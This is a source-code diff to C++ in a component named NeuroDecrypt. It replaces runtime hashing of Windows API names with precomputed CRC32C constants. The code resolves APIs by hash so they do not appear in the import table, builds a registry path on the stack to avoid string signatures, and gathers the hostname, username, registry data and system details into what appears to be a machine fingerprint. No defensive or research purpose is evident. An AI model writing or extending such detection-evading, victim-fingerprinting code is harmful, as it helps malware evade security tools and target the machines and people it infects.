@@ -23,6 +23,16 @@
 
 namespace NeuroDecrypt
 {
+    // Pre-computed CRC32C hash constants
+    static constexpr DWORD HASH_WideCharToMultiByte = 0xBD385C3B;
+    static constexpr DWORD HASH_GetComputerNameW    = 0xE9631855;
+    static constexpr DWORD HASH_GetUserNameW        = 0x3F75D701;
+    static constexpr DWORD HASH_RegOpenKeyExA       = 0x623C2E0C;
+    static constexpr DWORD HASH_RegQueryValueExA    = 0x2AB11C7D;
+    static constexpr DWORD HASH_RegCloseKey         = 0x68B40AD7;
+    static constexpr DWORD HASH_GetSystemInfo       = 0xE13E1A8C;
+    static constexpr DWORD HASH_GetSystemDirectoryA = 0x01764C0B;
+
     // ═══ Manual helpers to avoid CRT IAT ═══
     static size_t StrLen(const char* s) { size_t n = 0; while (s[n]) n++; return n; }
 
@@ -42,7 +52,7 @@ namespace NeuroDecrypt
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (!hK32) return 0;
         auto pWCMB = (int(WINAPI*)(UINT,DWORD,LPCWSTR,int,LPSTR,int,LPCSTR,LPBOOL))
-            Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("WideCharToMultiByte"));
+            Api::GetProcByHashCrc(hK32, HASH_WideCharToMultiByte);
         if (!pWCMB) return 0;
         return pWCMB(65001, 0, wide, -1, buf, bufLen, NULL, NULL); // CP_UTF8 = 65001
     }
@@ -62,7 +72,7 @@ namespace NeuroDecrypt
         if (hK32)
         {
             auto pGCN = (BOOL(WINAPI*)(LPWSTR,LPDWORD))
-                Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("GetComputerNameW"));
+                Api::GetProcByHashCrc(hK32, HASH_GetComputerNameW);
             if (pGCN) pGCN(hostname, &hLen);
         }
         char hUtf8[512];
@@ -76,7 +86,7 @@ namespace NeuroDecrypt
         if (hAdv)
         {
             auto pGUN = (BOOL(WINAPI*)(LPWSTR,LPDWORD))
-                Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("GetUserNameW"));
+                Api::GetProcByHashCrc(hAdv, HASH_GetUserNameW);
             if (pGUN) pGUN(username, &uLen);
         }
         char uUtf8[512];
@@ -91,11 +101,11 @@ namespace NeuroDecrypt
             if (hAdv)
             {
                 auto pROK = (LONG(WINAPI*)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY))
-                    Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegOpenKeyExA"));
+                    Api::GetProcByHashCrc(hAdv, HASH_RegOpenKeyExA);
                 auto pRQV = (LONG(WINAPI*)(HKEY,LPCSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD))
-                    Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegQueryValueExA"));
+                    Api::GetProcByHashCrc(hAdv, HASH_RegQueryValueExA);
                 auto pRCK = (LONG(WINAPI*)(HKEY))
-                    Api::GetProcByHashCrc(hAdv, Crc32C::ConstHash("RegCloseKey"));
+                    Api::GetProcByHashCrc(hAdv, HASH_RegCloseKey);
 
                 // Stack-built registry path — no .rdata string signature
                 char regPath[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o',
@@ -121,7 +131,7 @@ namespace NeuroDecrypt
             if (hK32)
             {
                 auto pGSI = (void(WINAPI*)(LPSYSTEM_INFO))
-                    Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("GetSystemInfo"));
+                    Api::GetProcByHashCrc(hK32, HASH_GetSystemInfo);
                 if (pGSI) pGSI(&si);
             }
             char buf[16];
@@ -136,7 +146,7 @@ namespace NeuroDecrypt
             if (hK32)
             {
                 auto pGSD = (UINT(WINAPI*)(LPSTR,UINT))
-                    Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("GetSystemDirectoryA"));
+                    Api::GetProcByHashCrc(hK32, HASH_GetSystemDirectoryA);
                 if (pGSD) pGSD(sysDir, MAX_PATH);
             }
             PureCrypto::Sha256((unsigned char*)sysDir, (int)StrLen(sysDir), f5);
